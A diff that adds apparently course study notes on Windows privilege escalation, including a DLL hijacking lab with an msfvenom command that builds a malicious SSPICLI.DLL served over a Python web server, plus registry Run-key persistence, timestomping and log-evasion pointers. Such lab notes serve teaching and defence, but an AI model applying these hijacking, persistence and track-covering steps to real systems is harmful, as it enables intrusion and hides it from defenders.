@@ -16,5 +16,147 @@ Notify me only when programs try to make changes to my computer
 Notify me only when programs try to make changes to my computer (do not dim my desktop)
 Never notify
 
+AutoElevate Executables
+Requested Execution Levels:
+asInvoker
+highestAvailable
+
+Scheduled Tasks & Services
+Items to evaluate include:
+Write Permissions
+Non-Standard Locations
+Unquoted Executable Paths
+Vulnerabilities in Executables
+Permissions to Run As SYSTEM
+
+## schtasks /query /fo LIST /v | findstr /i "Task to run"
+
+Download Putty win from resources Windows topics
+Open procmon as admin
+ctrl+L : 
+process name contains putty.exe, add
+path is contains .dll
+result is NAME NOT FOUND
+Apply, run putty.exe, a box appears press cancel
+
+Linux:
+msfvenom -p windows/exec CMD='cmd.exe /C "whoami" > C:\Users\student\Desktop\whoami.txt' -f dll > SSPICLI.DLL
+python3 -m http.server 42070  # hosting
+
+Windows:
+10.50.188.45:42070
+click on SPICLI.DLL download it and make sure antivirus is off
+On powershell
+(get-process | where-object -property processname -like "putty" ).kill()
+go to Downloads and make sure dll and putty are there
+execute putty and see new files were created at procmon
+
+Finding Vulnerable Services
+wmic service list full   ## pathname for possible attacks, Startmode= auto
+sc query
+
+SYSTEM Access and Defeating Protections
+Sysinternals
+Schedule Task
+UAC Bypass
+
+Persistance
+System changes or binary uploads that provide the adversary continued access to system
+
+Survives:
+Reboots
+Credential changes
+DHCP IP reassignmen
+Etc
+
+Considerations include:
+File naming
+File location
+Timestomping
+Port selection
+
+Registry
+HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\
+Run
+RunOnce
+
+HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\
+Run
+RunOnce
+
+Covering Tracks
+When does planning start?
+Prior Initial Access? After Initial Access? Before Exit?
+What will happen if I do X?
+Logs
+Checks
+Where are things?
+Hide
+File locations, names, times
+Know the system!
+
+Considerations
+Artifacts
+Determine which events will create a log
+Event Logs
+Applications, Security, Setup, System
+Blending In
+TimeStomping
+
+Where should you run commands from?
+Locally?
+Remote?
+wmic
+net
+netstat
+
+Audit Logging
+Show all audit category settings
+auditpol /get /category:*
+
+What does the below command show?
+auditpol /get /category:* | findstr /i "success failure"
+
+Important Microsoft Event IDs
+4624/4625
+
+Successful/failed login
+
+4624/4625
+Successful/failed login
+4720
+Account created
+4672
+Administrative user logged on
+7045
+Service created
+
+Event Logging
+Storage: c:\windows\system32\config\
+File-Type: .evtx/.evt
+wevtutil el
+wmic ntevent where "logfile="<LOGNAME>" list full
+Get-Eventlog -List
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
